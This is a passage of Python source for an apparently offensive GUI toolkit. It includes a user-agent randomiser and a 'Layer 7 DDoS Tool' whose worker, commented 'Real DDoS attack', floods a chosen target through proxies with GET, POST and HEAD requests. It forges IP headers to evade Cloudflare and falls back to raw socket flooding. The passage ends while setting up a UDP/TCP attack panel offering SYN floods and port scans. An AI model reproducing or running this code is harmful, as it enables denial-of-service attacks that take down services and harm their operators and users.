                        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{rv}) Gecko/20100101 Firefox/{rv}",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:{rv}) Gecko/20100101 Firefox/{rv}"
                    ],
                    "Edge": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{chrome_subver}.{chrome_subsubver} Safari/537.36 Edg/{edge_ver}.{edge_subver}.{edge_subsubver}",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{edge_ver}.{edge_subver}.{edge_subsubver}"
                    ]
                }
            },
            "Mac": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{major}_{minor}) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/{rv}"
                    ],
                    "Safari": [
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/605.1.15",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{major}_{minor}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/605.1.15"
                    ]
                }
            },
            "Linux": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
                        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (X11; Linux x86_64; rv:{rv}) Gecko/20100101 Firefox/{rv}",
                        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{rv}) Gecko/20100101 Firefox/{rv}"
                    ]
                }
            },
            "Android": {
                "Mobile": {
                    "Chrome": [
                        "Mozilla/5.0 (Linux; Android {android_ver}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Mobile Safari/537.36",
                        "Mozilla/5.0 (Linux; Android {android_ver}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Mobile Safari/537.36"
                    ],
                    "Firefox": [
                        "Mozilla/5.0 (Android {android_ver}; Mobile; rv:{rv}) Gecko/{rv} Firefox/{rv}"
                    ]
                }
            },
            "iOS": {
                "Mobile": {
                    "Safari": [
                        "Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (iPad; CPU OS {ios_ver}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
                    ]
                }
            }
        }
        
        # Device model options
        device_models = [
            "SM-G960F", "SM-G973F", "SM-G980F", "SM-G991B", "SM-G998B",  # Samsung models
            "iPhone12,1", "iPhone12,3", "iPhone12,5", "iPhone13,2", "iPhone13,3",  # iPhone models
            "Pixel 3", "Pixel 4", "Pixel 5", "Pixel 6",  # Pixel models
            "iPad8,1", "iPad8,2", "iPad11,3", "iPad11,4",  # iPad models
            "LM-Q720", "LM-X420",  # LG models
            "MI 9", "MI 10", "Redmi Note 8", "Redmi Note 9"  # Xiaomi models
        ]
        
        # Generate User-Agents
        generated_ua = []
        
        for i in range(count):
            # Select random values for placeholders
            ver = random.randint(90, 110)
            subver = random.randint(4000, 5000)
            subsubver = random.randint(100, 200)
            rv = random.randint(90, 100)
            major = random.randint(10, 14)
            minor = random.randint(0, 7)
            safari_ver = random.randint(130, 160)
            android_ver = f"{random.randint(8, 13)}.{random.randint(0, 2)}.{random.randint(0, 1)}"
            ios_ver = f"{random.randint(13, 16)}_{random.randint(0, 4)}"
            edge_ver = random.randint(90, 110)
            edge_subver = random.randint(1000, 2000)
            edge_subsubver = random.randint(100, 200)
            chrome_ver = random.randint(90, 110)
            chrome_subver = random.randint(4000, 5000)
            chrome_subsubver = random.randint(100, 200)
            
            # Determine OS
            if os_choice != "Any":
                selected_os = os_choice
            else:
                selected_os = random.choice(list(ua_templates.keys()))
            
            # Determine device
            if device_choice != "Any":
                selected_device = device_choice
            else:
                # Match device to OS if possible
                if selected_os in ["Android", "iOS"]:
                    selected_device = "Mobile"
                else:
                    selected_device = "Desktop"
            
            # Determine browser
            if browser_choice != "Any":
                selected_browser = browser_choice
            else:
                # Get available browsers for the selected OS and device
                available_browsers = list(ua_templates.get(selected_os, {}).get(selected_device, {}).keys())
                if available_browsers:
                    selected_browser = random.choice(available_browsers)
                else:
                    # Fallback to any available browser
                    all_browsers = []
                    for os_key, devices in ua_templates.items():
                        for device_key, browsers in devices.items():
                            all_browsers.extend(browsers.keys())
                    selected_browser = random.choice(list(set(all_browsers))) if all_browsers else "Chrome"
            
            # Get template
            template_list = ua_templates.get(selected_os, {}).get(selected_device, {}).get(selected_browser, [])
            
            if template_list:
                template = random.choice(template_list)
                
                # Replace placeholders
                ua = template.format(
                    ver=ver, subver=subver, subsubver=subsubver,
                    rv=rv, major=major, minor=minor,
                    safari_ver=safari_ver,
                    android_ver=android_ver,
                    ios_ver=ios_ver,
                    edge_ver=edge_ver, edge_subver=edge_subver, edge_subsubver=edge_subsubver,
                    chrome_ver=chrome_ver, chrome_subver=chrome_subver, chrome_subsubver=chrome_subsubver,
                    device_model=random.choice(device_models)
                )
                generated_ua.append(ua)
            
        # Display results
        self.ua_results_text.delete(1.0, tk.END)
        if generated_ua:
            for ua in generated_ua:
                self.ua_results_text.insert(tk.END, ua + "\n")
        else:
            self.ua_results_text.insert(tk.END, "No User-Agents generated. Please check your selections.\n")
        
        # Force update the text widget
        self.ua_results_text.update_idletasks()
        
        # Enable the add to file button
        self.add_to_file_btn.config(state=tk.NORMAL if generated_ua else tk.DISABLED)
        self.log_activity(f"Generated {len(generated_ua)} User-Agent strings")
        
        # Ensure the UI is properly updated
        self.ua_results_text.see(tk.END)
    
    def add_to_user_agents_file(self):
        # Get the generated User-Agents
        generated_text = self.ua_results_text.get(1.0, tk.END).strip()
        if not generated_text:
            messagebox.showwarning("Warning", "No User-Agents to add")
            return
        
        # Ask user if they want to add to file
        result = messagebox.askyesno("Add to File", "Do you want to add these User-Agents to user-agents.txt?")
        if not result:
            return
        
        # Append to user-agents.txt
        try:
            with open('user-agents.txt', 'a', encoding='utf-8') as f:
                # Add a newline if the file doesn't end with one
                f.write('\n' + generated_text)
            
            # Update the global USER_AGENTS list
            global USER_AGENTS
            new_agents = [line.strip() for line in generated_text.split('\n') if line.strip()]
            USER_AGENTS.extend(new_agents)
            
            messagebox.showinfo("Success", f"Added {len(new_agents)} User-Agents to user-agents.txt")
            self.log_activity(f"Added {len(new_agents)} User-Agents to user-agents.txt")
        
        except Exception as e:
            messagebox.showerror("Error", f"Failed to add User-Agents to file: {str(e)}")
            self.log_activity(f"Error adding User-Agents to file: {str(e)}")
    
    def create_ddos_ui(self):
        # Main frame for DDoS
        ddos_main_frame = ttk.LabelFrame(self.ddos_frame, text="D-Attack - Layer 7 DDoS Tool", padding=10)
        ddos_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(ddos_main_frame, text="Attack Configuration", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # URL/IP entry
        ttk.Label(controls_frame, text="Target URL/IP:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_target_var = tk.StringVar()
        self.ddos_target_entry = ttk.Entry(controls_frame, textvariable=self.ddos_target_var, width=50, font=("Arial", 10))
        self.ddos_target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(0, 10), pady=5)
        
        # Port entry
        ttk.Label(controls_frame, text="Port:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_port_var = tk.StringVar(value="80")
        self.ddos_port_entry = ttk.Entry(controls_frame, textvariable=self.ddos_port_var, width=10, font=("Arial", 10))
        self.ddos_port_entry.grid(row=1, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Thread count
        ttk.Label(controls_frame, text="Threads:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_threads_var = tk.StringVar(value="10")
        self.ddos_threads_spinbox = tk.Spinbox(controls_frame, from_=1, to=1000, textvariable=self.ddos_threads_var, width=10, font=("Arial", 10))
        self.ddos_threads_spinbox.grid(row=2, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Mbps entry
        ttk.Label(controls_frame, text="Bandwidth (Mbps):", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_mbps_var = tk.StringVar(value="10")
        self.ddos_mbps_spinbox = tk.Spinbox(controls_frame, from_=1, to=1200, textvariable=self.ddos_mbps_var, width=10, font=("Arial", 10))
        self.ddos_mbps_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Cloudflare bypass checkbox
        self.ddos_cf_bypass_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(controls_frame, text="Cloudflare Bypass", variable=self.ddos_cf_bypass_var).grid(row=4, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        
        # 2Captcha bypass checkbox
        self.ddos_2captcha_bypass_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(controls_frame, text="2Captcha Bypass", variable=self.ddos_2captcha_bypass_var).grid(row=4, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        controls_frame.grid_columnconfigure(1, weight=1)
        
        # Attack buttons
        buttons_frame = ttk.Frame(controls_frame)
        buttons_frame.grid(row=5, column=0, columnspan=2, pady=10)
        
        self.ddos_start_btn = ttk.Button(buttons_frame, text="Start Attack", command=self.start_ddos_attack, style='Danger.TButton')
        self.ddos_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.ddos_stop_btn = ttk.Button(buttons_frame, text="Stop Attack", command=self.stop_ddos_attack, state=tk.DISABLED)
        self.ddos_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Proxy selection frame
        proxy_selection_frame = ttk.LabelFrame(ddos_main_frame, text="Proxies for Attack", padding=10)
        proxy_selection_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Proxy status label
        self.ddos_proxy_status_label = ttk.Label(proxy_selection_frame, text="Enabled Proxies: 0", font=("Arial", 10, "bold"))
        self.ddos_proxy_status_label.pack(anchor=tk.W, pady=(0, 10))
        
        # Proxy list frame
        proxy_list_frame = ttk.Frame(proxy_selection_frame)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a canvas and scrollbar for proxy list
        canvas_frame = ttk.Frame(proxy_list_frame)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.proxy_canvas = tk.Canvas(canvas_frame, height=100)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.proxy_canvas.yview)
        self.proxy_scrollable_frame = ttk.Frame(self.proxy_canvas)
        
        self.proxy_scrollable_frame.bind(
            "<Configure>",
            lambda e: self.proxy_canvas.configure(scrollregion=self.proxy_canvas.bbox("all"))
        )
        
        self.proxy_canvas.create_window((0, 0), window=self.proxy_scrollable_frame, anchor="nw")
        self.proxy_canvas.configure(yscrollcommand=scrollbar.set)
        
        self.proxy_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Terminal output frame
        terminal_frame = ttk.LabelFrame(ddos_main_frame, text="Attack Terminal", padding=10)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal text area
        self.ddos_terminal = scrolledtext.ScrolledText(terminal_frame, height=20, font=("Consolas", 9))
        self.ddos_terminal.pack(fill=tk.BOTH, expand=True)
        
        # Update proxy list initially
        self.update_ddos_proxy_list()
        
        # Initialize attack variables
        self.ddos_attack_running = False
        self.packet_count = 0
        
        # Update proxy status and list initially
        self.update_ddos_proxy_status()
        self.update_ddos_proxy_list()
        
    def start_ddos_attack(self):
        target = self.ddos_target_var.get().strip()
        port = self.ddos_port_var.get().strip()
        threads = self.ddos_threads_var.get().strip()
        mbps = self.ddos_mbps_var.get().strip()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target URL/IP")
            return
        
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid port number (1-65535)")
            return
        
        try:
            thread_count = int(threads)
            if thread_count <= 0:
                raise ValueError("Thread count must be positive")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid thread count")
            return
        
        try:
            mbps_val = int(mbps)
            if mbps_val <= 0 or mbps_val > 1200:
                raise ValueError("Mbps value must be between 1 and 1200")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid Mbps value (1-1200)")
            return
        
        # Check if bypass options are enabled
        cf_bypass = self.ddos_cf_bypass_var.get()
        captcha_bypass = self.ddos_2captcha_bypass_var.get()
        
        # Start attack
        self.ddos_attack_running = True
        self.packet_count = 0
        self.ddos_start_btn.config(state=tk.DISABLED)
        self.ddos_stop_btn.config(state=tk.NORMAL)
        
        bypass_info = []
        if cf_bypass:
            bypass_info.append("CF")
        if captcha_bypass:
            bypass_info.append("2Captcha")
        
        bypass_text = f" with {'+'.join(bypass_info)} bypass" if bypass_info else ""
        
        self.log_to_ddos_terminal("Starting D-Attack against {}:{} with {} threads at {} Mbps{}...\n".format(target, port, threads, mbps, bypass_text))
        
        # Start attack threads
        for i in range(thread_count):
            thread = threading.Thread(target=self.ddos_worker, args=(target, port_num, mbps_val, cf_bypass, captcha_bypass), daemon=True)
            thread.start()
        
    def stop_ddos_attack(self):
        self.ddos_attack_running = False
        self.ddos_start_btn.config(state=tk.NORMAL)
        self.ddos_stop_btn.config(state=tk.DISABLED)
        self.log_to_ddos_terminal("D-Attack stopped. Total packets sent: {}\n".format(self.packet_count))
    
    def ddos_worker(self, target, port, mbps, cf_bypass=True, captcha_bypass=False):
        # Real DDoS attack by sending actual network requests through proxies
        import socket
        import ssl
        import random
        import requests
        from urllib.parse import urlparse
        
        # Calculate how much data to send based on Mbps
        # 1 Mbps = 1,000,000 bits per second = 125,000 bytes per second
        bytes_per_second = mbps * 125000
        
        # Read proxies from file
        proxies_list = self.load_proxies()
        
        while self.ddos_attack_running:
            try:
                # Select a random proxy
                proxy = random.choice(proxies_list) if proxies_list else None
                
                if proxy:
                    # Use requests with proxy for better compatibility
                    proxy_parts = proxy.split(':')
                    if len(proxy_parts) == 2:
                        proxy_url = f"http://{proxy}"
                        proxies = {
                            'http': proxy_url,
                            'https': proxy_url,
                        }
                        
                        # Create session with proxy
                        session = requests.Session()
                        session.headers.update({'User-Agent': self.current_user_agent})
                        
                        # Add bypass headers if enabled
                        if cf_bypass:
                            # Add headers to bypass Cloudflare
                            session.headers.update({
                                'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Host': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Forwared-Host': f"{target}",
                                'CF-Connecting-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'True-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                            })
                        
                        # Try to make requests through proxy
                        try:
                            # Send multiple requests to increase traffic
                            request_count = min(20, mbps // 5 + 1)  # Increased from 10 to 20
                            for _ in range(request_count):
                                # Add random headers to bypass protections
                                headers = {
                                    'User-Agent': self.current_user_agent,
                                    'Accept': '*/*',
                                    'Accept-Language': 'en-US,en;q=0.9,en-GB;q=0.8,en-CA;q=0.7',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Connection': 'keep-alive',
                                    'Upgrade-Insecure-Requests': '1',
                                    'Cache-Control': 'no-cache',
                                    'Pragma': 'no-cache',
                                    'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Originating-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Remote-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Remote-Addr': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Forwarded-Host': f"{target}",
                                    'X-Forwarded-Server': f"{target}",
                                }
                                
                                # Make GET request through proxy
                                try:
                                    response = session.get(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Make POST request through proxy
                                try:
                                    session.post(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False,
                                        data={'data': 'a' * min(2048, max(100, bytes_per_second // 50))}  # Increased data size
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Make HEAD request through proxy
                                try:
                                    session.head(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Try with HTTPS as well
                                try:
                                    session.get(
                                        f"https://{target}:{port if port != 80 else 443}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Try multiple path variations
                                paths = ['/', '/index.html', '/api/', '/admin/', '/login', '/app/', '/static/']
                                for path in paths:
                                    try:
                                        session.get(
                                            f"http://{target}:{port}{path}",
                                            proxies=proxies,
                                            headers=headers,
                                            timeout=10,
                                            verify=False
                                        )
                                    except requests.exceptions.RequestException:
                                        pass
                        except requests.exceptions.RequestException:
                            # If there's an error, continue with next iteration
                            pass
                        
                        # Close session
                        try:
                            session.close()
                        except:
                            pass  # Ignore errors when closing session
                        
                        # Generate optimized code for the attack in the appropriate language
                        attack_functionality = "ddos_attack"
                        attack_code = self.generate_optimized_code_for_functionality(attack_functionality, f"http://{target}:{port}")
                        
                        # Log the generated code for the attack
                        try:
                            # Add to activity log
                            language = self.get_language_for_functionality(attack_functionality)
                            self.log_activity(f"DDoS attack on {target}:{port} - Generated code in {language}")
                        except:
                            pass
                    else:
                        # If proxy format is invalid, try direct connection
                        self.direct_ddos_request(target, port, mbps, bytes_per_second)
                else:
                    # If no proxies available, use direct connection
                    self.direct_ddos_request(target, port, mbps, bytes_per_second)
                
                # Increment packet count
                self.packet_count += 1
                
                # Update terminal in main thread
                self.root.after(0, lambda: self.log_to_ddos_terminal(
                    f"The glitch system <package sent {self.packet_count} ms={random.randint(1, 100)}>\n"))
                
                # Small delay
                time.sleep(0.01)
                
            except Exception as e:
                # Keep trying even if there are connection errors
                time.sleep(0.01)  # Small delay to prevent excessive CPU usage
                continue
    
    def direct_ddos_request(self, target, port, mbps, bytes_per_second):
        # Direct connection when no proxy is available
        import socket
        import ssl
        import random
        
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # 3 second timeout
            
            # Connect to target
            sock.connect((target, port))
            
            # Determine if we need SSL based on port
            if port == 443 or target.startswith('https'):
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target)
            
            # Create HTTP GET request
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.current_user_agent}\r\nConnection: keep-alive\r\n\r\n"
            
            # Send request
            sock.send(request.encode())
            
            # Send additional data based on Mbps setting
            # Create random data to increase bandwidth usage
            random_data_size = min(1024, max(100, bytes_per_second // 100))  # Adjust data size based on Mbps
            random_data = b'A' * random_data_size
            
            # Try to send additional data to increase bandwidth
            try:
                # Send multiple small requests to keep connection alive and increase traffic
                for _ in range(min(10, mbps // 10 + 1)):  # More requests for higher Mbps
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                    time.sleep(0.01)  # Small delay between requests
            except:
                pass
            
            # Receive response to keep connection active
            try:
                sock.recv(1024)
            except:
                pass  # Ignore if no response
            
            # Close socket
            sock.close()
        except:
            pass  # Ignore connection errors
    
    def load_proxies(self):
        # Load proxies from proxies.txt file
        proxies = []
        try:
            with open('proxies.txt', 'r', encoding='utf-8-sig') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        # Validate proxy format (IP:PORT)
                        parts = line.split(':')
                        if len(parts) == 2:
                            ip, port = parts
                            # Basic IP validation
                            ip_parts = ip.split('.')
                            if len(ip_parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip_parts):
                                # Basic port validation
                                port_num = int(port)
                                if 1 <= port_num <= 65535:
                                    proxies.append(line)
        except FileNotFoundError:
            # If file doesn't exist, return empty list
            pass
        except UnicodeDecodeError:
            # If UTF-8 fails, try with latin-1
            try:
                with open('proxies.txt', 'r', encoding='latin-1') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            # Validate proxy format (IP:PORT)
                            parts = line.split(':')
                            if len(parts) == 2:
                                ip, port = parts
                                # Basic IP validation
                                ip_parts = ip.split('.')
                                if len(ip_parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip_parts):
                                    # Basic port validation
                                    port_num = int(port)
                                    if 1 <= port_num <= 65535:
                                        proxies.append(line)
            except:
                pass
        except ValueError:
            # Handle any invalid port numbers
            pass
        
        # Filter to only return enabled proxies if we have the proxy management system
        if hasattr(self, 'proxies'):
            enabled_proxies = [f"{proxy['ip']}:{proxy['port']}" for proxy in self.proxies if proxy.get('enabled', False)]
            return enabled_proxies
        
        return proxies
    
    def log_to_ddos_terminal(self, message):
        try:
            # Check if the terminal still exists
            if hasattr(self, 'ddos_terminal') and self.ddos_terminal.winfo_exists():
                # Add message to terminal
                self.ddos_terminal.insert(tk.END, message)
                
                # Color the "The glitch system" part green
                if "The glitch system" in message:
                    # Find the index of the newly inserted text
                    end_index = self.ddos_terminal.index(tk.END)
                    line_num = int(end_index.split('.')[0]) - 1  # Get the line number of the last line
                    
                    # Find the start and end of the line
                    line_start = f"{line_num}.0"
                    line_end = f"{line_num}.end"
                    
                    # Search for "The glitch system" in the line
                    search_result = self.ddos_terminal.search("The glitch system", line_start, line_end)
                    
                    if search_result:
                        end_pos = f"{search_result}+{len('The glitch system')}c"
                        self.ddos_terminal.tag_add("green", search_result, end_pos)
                        self.ddos_terminal.tag_config("green", foreground="green")
                
                # Scroll to end
                self.ddos_terminal.see(tk.END)
                
                # Update the UI
                self.ddos_terminal.update_idletasks()
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def create_udp_tcp_ui(self):
        # Main frame for UDP/TCP attack
        udp_tcp_main_frame = ttk.LabelFrame(self.udp_tcp_frame, text="UDP/TCP Attack - Network Layer Attacks", padding=10)
        udp_tcp_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Attack Configuration", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Target entry
        ttk.Label(controls_frame, text="Target IP/Host:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_target_var = tk.StringVar()
        self.udp_tcp_target_entry = ttk.Entry(controls_frame, textvariable=self.udp_tcp_target_var, width=50, font=("Arial", 10))
        self.udp_tcp_target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(0, 10), pady=5)
        
        # Port entry
        ttk.Label(controls_frame, text="Target Port:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_port_var = tk.StringVar(value="80")
        self.udp_tcp_port_entry = ttk.Entry(controls_frame, textvariable=self.udp_tcp_port_var, width=10, font=("Arial", 10))
        self.udp_tcp_port_entry.grid(row=1, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Protocol selection
        ttk.Label(controls_frame, text="Protocol:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_protocol_var = tk.StringVar(value="UDP")
        self.udp_tcp_protocol_combo = ttk.Combobox(controls_frame, textvariable=self.udp_tcp_protocol_var, 
                                            values=["UDP", "TCP", "TCP SYN Flood"], state="readonly", width=15)
        self.udp_tcp_protocol_combo.grid(row=2, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Thread count
        ttk.Label(controls_frame, text="Threads:", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_threads_var = tk.StringVar(value="10")
        self.udp_tcp_threads_spinbox = tk.Spinbox(controls_frame, from_=1, to=1000, textvariable=self.udp_tcp_threads_var, width=10, font=("Arial", 10))
        self.udp_tcp_threads_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Packet size
        ttk.Label(controls_frame, text="Packet Size (bytes):", font=("Arial", 10, "bold")).grid(row=4, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_packet_size_var = tk.StringVar(value="1024")
        self.udp_tcp_packet_size_spinbox = tk.Spinbox(controls_frame, from_=64, to=65535, textvariable=self.udp_tcp_packet_size_var, width=10, font=("Arial", 10))
        self.udp_tcp_packet_size_spinbox.grid(row=4, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Attack type
        ttk.Label(controls_frame, text="Attack Type:", font=("Arial", 10, "bold")).grid(row=5, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_attack_type_var = tk.StringVar(value="Flood")
        self.udp_tcp_attack_type_combo = ttk.Combobox(controls_frame, textvariable=self.udp_tcp_attack_type_var, 
                                            values=["Flood", "Port Scan", "Connection Flood"], state="readonly", width=15)
        self.udp_tcp_attack_type_combo.grid(row=5, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        controls_frame.grid_columnconfigure(1, weight=1)
        
        # Attack buttons
        buttons_frame = ttk.Frame(controls_frame)
        buttons_frame.grid(row=6, column=0, columnspan=2, pady=10)
        
        self.udp_tcp_start_btn = ttk.Button(buttons_frame, text="Start Attack", command=self.start_udp_tcp_attack, style='Danger.TButton')
        self.udp_tcp_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.udp_tcp_stop_btn = ttk.Button(buttons_frame, text="Stop Attack", command=self.stop_udp_tcp_attack, state=tk.DISABLED)
        self.udp_tcp_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Proxy selection frame
        proxy_selection_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Proxies for Attack", padding=10)
        proxy_selection_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Proxy status label
        self.udp_tcp_proxy_status_label = ttk.Label(proxy_selection_frame, text="Enabled Proxies: 0", font=("Arial", 10, "bold"))
        self.udp_tcp_proxy_status_label.pack(anchor=tk.W, pady=(0, 10))
        
        # Proxy list frame
        proxy_list_frame = ttk.Frame(proxy_selection_frame)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a canvas and scrollbar for proxy list
        canvas_frame = ttk.Frame(proxy_list_frame)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.udp_tcp_proxy_canvas = tk.Canvas(canvas_frame, height=100)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.udp_tcp_proxy_canvas.yview)
        self.udp_tcp_proxy_scrollable_frame = ttk.Frame(self.udp_tcp_proxy_canvas)
        
        self.udp_tcp_proxy_scrollable_frame.bind(
            "<Configure>",
            lambda e: self.udp_tcp_proxy_canvas.configure(scrollregion=self.udp_tcp_proxy_canvas.bbox("all"))
        )
        
